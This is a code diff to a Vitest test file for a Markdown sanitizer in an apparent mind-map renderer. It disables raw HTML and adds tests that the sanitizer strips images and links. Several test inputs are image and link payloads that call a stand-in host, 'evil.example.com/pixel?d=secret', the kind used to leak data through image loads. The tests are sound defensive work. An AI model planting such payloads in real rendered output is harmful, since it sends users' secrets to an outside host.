@@ -3,7 +3,7 @@ import { describe, expect, it } from "vitest";
 import { neutralizeImageAndLinkTokens } from "./markmapNeutralizer";
 
 const render = (markdown: string): string => {
-    const md = new MarkdownIt({ html: true, breaks: true });
+    const md = new MarkdownIt({ html: false, breaks: true });
     neutralizeImageAndLinkTokens(md);
     return md.render(markdown);
 };
@@ -47,5 +47,26 @@ describe("neutralizeImageAndLinkTokens", () => {
         expect(html).not.toContain("<a ");
         expect(html).toContain("see");
         expect(html).toContain("x");
+    });
+
+    it("neutralizes reference images that span a code span and a multiline definition", () => {
+        const html = render("# Ideen\n- ![pixel `x`][ref]\n\n[ref]:\nhttps://evil.example.com/pixel?d=secret");
+        expect(html).not.toContain("<img");
+        expect(html).not.toContain("evil.example.com");
+    });
+
+    it("neutralizes images behind escaped backtick runs", () => {
+        const html = render("\\`![pixel](\nhttps://evil.example.com/pixel?d=secret\n)`");
+        expect(html).not.toContain("<img");
+        expect(html).not.toContain("evil.example.com");
+    });
+
+    it("escapes raw html in labels instead of rendering it", () => {
+        const html = render('# Ideen\n- <img src="https://evil.example.com/pixel?d=secret">\n- <a href="https://evil.example.com">Link</a>');
+        expect(html).not.toContain("<img");
+        expect(html).not.toContain("<a ");
+        expect(html).toContain("&lt;img");
+        expect(html).toContain("&lt;a");
+        expect(html).toContain("Link");
     });
 });
